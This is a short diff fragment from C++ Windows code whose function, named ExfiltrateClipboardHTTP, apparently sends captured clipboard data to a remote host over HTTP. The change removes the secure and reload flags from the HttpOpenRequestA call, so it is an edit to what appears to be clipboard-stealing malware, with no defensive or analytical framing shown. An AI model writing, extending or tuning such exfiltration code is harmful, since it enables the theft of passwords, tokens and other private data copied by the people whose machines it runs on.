@@ -27,7 +27,7 @@ bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, c
     HINTERNET hRequest = HttpOpenRequestA(
         hConnect, post, path.c_str(),
         NULL, NULL, NULL,
-        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 
+        INTERNET_FLAG_NO_CACHE_WRITE, 
         0
     );
     if(!hRequest) 
